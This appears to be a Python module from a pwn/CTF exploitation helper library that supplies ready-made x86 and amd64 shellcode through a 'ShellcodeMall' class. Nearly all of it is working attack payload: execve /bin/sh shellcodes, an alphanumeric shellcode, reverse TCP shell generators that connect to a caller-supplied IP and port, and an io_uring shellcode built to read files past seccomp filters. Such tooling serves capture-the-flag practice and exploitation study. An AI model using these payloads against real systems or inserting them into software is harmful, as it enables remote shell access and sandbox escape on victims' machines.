#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    : shellcode.py
@Time    : 2021/11/23 23:44:54
@Author  : Roderick Chan
@Email   : roderickchan@foxmail.com
@Desc    : Sell convenient shellcodes
'''

import sys

from pwn import pack, asm, context

__all__ = [
    "ShellcodeMall",
    "shellcode2unicode"
]


class ShellcodeMall:
    # most of these shellcode from http://shell-storm.org/shellcode/
    class amd64:
        __all_execve_bin_sh = {
            27: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
            29: b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
        }
        execve_bin_sh = __all_execve_bin_sh[27]
        execveat_bin_sh = __all_execve_bin_sh[29]
        cat_flag = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
        ls_current_dir = b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"

        @staticmethod
        def ascii_shellcode(reg="rax"):
            __m = {
                "rax": b"P",
                "rbx": b"S",
                "rcx": b"Q",
                "rdx": b"R",
                "rdi": b"W",
                "rsi": b"V",
                "rsp": b"T",
                "rbp": b"U"
            }
            if reg not in __m:
                print("only supported: ", __m.keys())
                sys.exit(1)
            return __m[reg] + b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"


        @staticmethod
        def reverse_tcp_connect(ip: str, port: int) -> bytes:
            # from http://shell-storm.org/shellcode/files/shellcode-907.php
            """
            /* socket(AF_INET, SOCK_STREAM, 0) */
            socket:
                push 41
                pop rax
                cdq
                push 2
                pop rdi
                push 1
                pop rsi
                syscall

            /* connect(s, addr, len(addr))  */
            connect:
                xchg eax, edi
                mov al, 42
                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
                push rcx
                push rsp
                pop rsi
                mov dl, 16
                syscall
            """
            int_ip = 0
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            res = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
                port.to_bytes(2, "big") + int_ip.to_bytes(4,
                                                          "big") + b"\x51\x54\x5e\xb2\x10\x0f\x05"
            return res

        @staticmethod
        def reverse_tcp_shell(ip: str, port: int) -> bytes:
            # from http://shell-storm.org/shellcode/files/shellcode-907.php
            """
            /* socket(AF_INET, SOCK_STREAM, 0) */
            socket:
                push 41
                pop rax
                cdq
                push 2
                pop rdi
                push 1
                pop rsi
                syscall

            /* connect(s, addr, len(addr))  */
            connect:
                xchg eax, edi
                mov al, 42
                mov rcx, 0x0100007f5c110002 /*127.0.0.1:4444 --> 0x7f000001:0x115c*/
                push rcx
                push rsp
                pop rsi
                mov dl, 16
                syscall
            dup2:
                push 3
                pop rsi
            dup2_loop:
                mov al, 33
                dec esi
                syscall
                jnz dup2_loop
            execve:
                cdq
                mov al, 59
                push rdx
                mov rcx, 0x68732f6e69622f
                push rcx
                push rsp
                pop rdi
                syscall
            """
            int_ip = 0
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            return b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" + \
                port.to_bytes(2, "big") + int_ip.to_bytes(4, "big") + \
                b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"

        @staticmethod
        def io_uring_cat_flag(filename: str = "/flag", fd: int = 1) -> bytes:
            """Read a file via io_uring and write to fd, bypassing seccomp that
            blocks open/openat/openat2. Uses io_uring OPENAT + READ + WRITE SQEs.

            Args:
                filename: Path to read (default "/flag")
                fd: File descriptor to write output to (default 1 = stdout)

            Returns:
                Assembled shellcode bytes (amd64)
            """
            old_ctx = context.arch
            context.arch = "amd64"
            # Encode filename with null terminator, pad to 8-byte alignment
            fname_bytes = filename.encode() + b"\x00"
            fname_len = len(fname_bytes)

            sc = f"""
            /* === io_uring cat flag shellcode === */
            /* Uses io_uring to: OPENAT(filename) -> READ -> WRITE({fd}) */

            push rbp
            sub rsp, 0x188
            mov rbp, rsp

            /* Store filename on stack at [rsp+0x6a] */
            lea r12, [rsp+0x70]     /* r12 = buffer for read data */
            """

            # Write filename bytes to stack at [rsp+0x6a]
            offset = 0x6a
            for i in range(0, fname_len, 8):
                chunk = fname_bytes[i:i+8].ljust(8, b'\x00')
                val = int.from_bytes(chunk, 'little')
                if i + 8 <= fname_len or fname_len - i >= 8:
                    sc += f"    mov rax, {hex(val)}\n"
                    sc += f"    mov QWORD PTR [rsp+{hex(offset + i)}], rax\n"
                else:
                    # Partial write for remaining bytes
                    remaining = fname_len - i
                    if remaining >= 4:
                        sc += f"    mov DWORD PTR [rsp+{hex(offset + i)}], {hex(val & 0xffffffff)}\n"
                        if remaining > 4:
                            sc += f"    mov WORD PTR [rsp+{hex(offset + i + 4)}], {hex((val >> 32) & 0xffff)}\n"
                    elif remaining >= 2:
                        sc += f"    mov WORD PTR [rsp+{hex(offset + i)}], {hex(val & 0xffff)}\n"
                        if remaining > 2:
                            sc += f"    mov BYTE PTR [rsp+{hex(offset + i + 2)}], {hex((val >> 16) & 0xff)}\n"
                    else:
                        sc += f"    mov BYTE PTR [rsp+{hex(offset + i)}], {hex(val & 0xff)}\n"

            sc += f"""
            /* Zero out the buffer area */
            xor eax, eax
            mov ecx, 0x20
            mov rdi, r12
            rep stosq

            /* Zero out the uring struct area */
            mov ecx, 0xd
            mov rdi, rbp
            rep stosq

            /* app_setup_uring(rbp) */
            mov rdi, rbp
            call app_setup_uring

            /* OPENAT: do_io_uring(opcode=0x12, fd=AT_FDCWD, buf=filename, len=0, uring=rbp) */
            xor ecx, ecx
            lea rdx, [rsp+0x6a]
            mov r8, rbp
            mov esi, 0xffffff9c       /* AT_FDCWD */
            mov edi, 0x12             /* IORING_OP_OPENAT */
            call do_io_uring
            call sleep

            /* READ: do_io_uring(opcode=0x16, fd=result, buf=r12, len=0x100, uring=rbp) */
            mov r8, rbp
            mov ecx, 0x100
            mov rdx, r12
            mov esi, 0x4              /* fd from openat result (fixed file slot) */
            mov edi, 0x16             /* IORING_OP_READ */
            call do_io_uring
            call sleep

            /* WRITE: do_io_uring(opcode=0x17, fd={fd}, buf=r12, len=0x100, uring=rbp) */
            mov edi, 0x17             /* IORING_OP_WRITE */
            mov r8, rbp
            mov rdx, r12
            mov ecx, 0x100
            mov esi, {fd}
            call do_io_uring
            call sleep

            /* exit(0) */
            xor edi, edi
            mov eax, 60
            syscall

            /* === helper functions === */

            memset:
                mov eax, esi
                mov rcx, rdx
                rep stosb
                ret

            io_uring_setup:
                mov eax, 0x1a9
                syscall
                ret

            io_uring_enter:
                push r8
                push r9
                push r10
                mov eax, 0x1aa
                mov r10, rcx
                xor r8, r8
                xor r9, r9
                syscall
                pop r10
                pop r9
                pop r8
                ret

            mmap:
                push r10
                mov eax, 0x9
                mov r10, rcx
                syscall
                pop r10
                ret

            sleep:
                sub rsp, 0x18
                mov rdi, rsp
                mov QWORD PTR [rsp], 0x1
                mov QWORD PTR [rsp+0x8], 0x0
                mov rsi, rdi
                mov eax, 0x23
                syscall
                add rsp, 0x18
                ret

            app_setup_uring:
                push r12
                xor eax, eax
                mov ecx, 0x1e
                push rbp
                push rbx
                mov rbx, rdi
                add rsp, 0xffffffffffffff80
                lea rsi, [rsp+0x8]
                mov rdi, rsi
                rep stosd
                mov edi, 0x3
                call io_uring_setup
                mov edx, DWORD PTR [rsp+0x8]
                mov r12d, DWORD PTR [rsp+0xc]
                xor edi, edi
                mov DWORD PTR [rbx], eax
                mov r8d, eax
                mov eax, DWORD PTR [rsp+0x48]
                xor r9d, r9d
                mov ecx, 0x8001
                shl r12d, 0x4
                add r12d, DWORD PTR [rsp+0x6c]
                lea esi, [rax+rdx*4]
                mov edx, 0x3
                movsxd rsi, esi
                call mmap
                mov r8d, DWORD PTR [rbx]
                movsxd rsi, r12d
                mov ecx, 0x8001
                mov r9d, 0x8000000
                mov edx, 0x3
                xor edi, edi
                mov rbp, rax
                call mmap
                mov esi, DWORD PTR [rsp+0x8]
                mov r8d, DWORD PTR [rbx]
                xor edi, edi
                mov r12, rax
                mov eax, DWORD PTR [rsp+0x30]
                mov r9d, 0x10000000
                mov ecx, 0x8001
                shl rsi, 0x6
                mov edx, 0x3
                add rax, rbp
                mov QWORD PTR [rbx+0x8], rax
                mov eax, DWORD PTR [rsp+0x34]
                add rax, rbp
                mov QWORD PTR [rbx+0x10], rax
                mov eax, DWORD PTR [rsp+0x38]
                add rax, rbp
                mov QWORD PTR [rbx+0x18], rax
                mov eax, DWORD PTR [rsp+0x3c]
                add rax, rbp
                mov QWORD PTR [rbx+0x20], rax
                mov eax, DWORD PTR [rsp+0x40]
                add rax, rbp
                mov QWORD PTR [rbx+0x28], rax
                mov eax, DWORD PTR [rsp+0x48]
                add rbp, rax
                mov QWORD PTR [rbx+0x30], rbp
                call mmap
                mov QWORD PTR [rbx+0x38], rax
                mov eax, DWORD PTR [rsp+0x58]
                add rax, r12
                mov QWORD PTR [rbx+0x40], rax
                mov eax, DWORD PTR [rsp+0x5c]
                add rax, r12
                mov QWORD PTR [rbx+0x48], rax
                mov eax, DWORD PTR [rsp+0x60]
                add rax, r12
                mov QWORD PTR [rbx+0x50], rax
                mov eax, DWORD PTR [rsp+0x64]
                add rax, r12
                mov QWORD PTR [rbx+0x58], rax
                mov eax, DWORD PTR [rsp+0x6c]
                add r12, rax
                xor eax, eax
                mov QWORD PTR [rbx+0x60], r12
                sub rsp, 0xffffffffffffff80
                pop rbx
                pop rbp
                pop r12
                ret

            do_io_uring:
                push rax
                mov rax, QWORD PTR [r8+0x10]
                mov r9d, esi
                mov rsi, rdx
                mov edx, DWORD PTR [rax]
                mov rax, QWORD PTR [r8+0x18]
                mov r11d, DWORD PTR [rax]
                and r11d, edx
                inc edx
                mov r10d, r11d
                mov rax, r10
                shl rax, 0x6
                add rax, QWORD PTR [r8+0x38]
                mov BYTE PTR [rax+0x1], 0x0
                mov BYTE PTR [rax], dil
                mov DWORD PTR [rax+0x4], r9d
                mov QWORD PTR [rax+0x10], rsi
                mov DWORD PTR [rax+0x18], ecx
                mov QWORD PTR [rax+0x8], 0x0
                mov QWORD PTR [rax+0x20], 0x0
                mov rax, QWORD PTR [r8+0x30]
                mov DWORD PTR [rax+r10*4], r11d
                mov rax, QWORD PTR [r8+0x10]
                mov DWORD PTR [rax], edx
                mov edi, DWORD PTR [r8]
                mov edx, 0x1
                mov ecx, 0x1
                mov esi, 0x1
                call io_uring_enter
                xor eax, eax
                pop rdx
                ret
            """
            result = asm(sc)
            context.arch = old_ctx
            return result

    class i386:
        __all_execve_bin_sh = {
            21: b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80",
            23: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
            28: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80",
            33: b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80",
            49: b"\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
        }
        execve_bin_sh = __all_execve_bin_sh[21]
        cat_flag = b"\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80"
        ls_current_dir = b"\x68\x01\x01\x01\x01\x81\x34\x24\x2f\x2e\x01\x01\x89\xe3\xb9\xff\xff\xfe\xff\xf7\xd1\x31\xd2\x6a\x05\x58\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb6\x02\x31\xc0\xb0\x8d\xcd\x80\x6a\x01\x5b\x89\xe1\x31\xd2\xb6\x02\x6a\x04\x58\xcd\x80"

        @staticmethod
        def reverse_tcp_shell(ip: str, port: int) -> bytes:
            int_ip = 0
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            return b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"+int_ip.to_bytes(4, "big")+b"\x66\x68"+port.to_bytes(2, "big")+b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


    @staticmethod
    def generate_payload_for_connect(ip: str, port: int) -> bytes:
        """connect(socket_fd, buf, 0x10), generate payload of buf
        
        assert len(buf) == 0x10
        
        """
        int_ip = 0
        for i in ip.strip().split("."):
            int_ip <<= 8
            int_ip |= int(i)
        
        return pack(2, word_size=16, endianness="little") + pack(port, word_size=16, endianness="big") + pack(int_ip, word_size=32, endianness="big") + pack(0, 64)



def shellcode2unicode(shellcode: str or bytes) -> str:
    """Switch a shellcode to unicode-form, like: 'a' --> '\\x61'

    Args:
        shellcode (str, bytes): shellcode.

    Returns:
        str: string with '\\x'.

    Example:
        >>> s = shellcode2unicode('abcd')
        >>> print(s)
        \\x61\\x62\\x63\\x64
    """
    assert isinstance(shellcode, (str, bytes))
    if isinstance(shellcode, str):
        shellcode = shellcode.encode('latin-1')
    shellcode = shellcode.hex()
    res = ""
    for i in range(0, len(shellcode), 2):
        res += "\\x{}".format(shellcode[i:i+2])
    return res


if __name__ == '__main__':
    import doctest
    doctest.testmod()
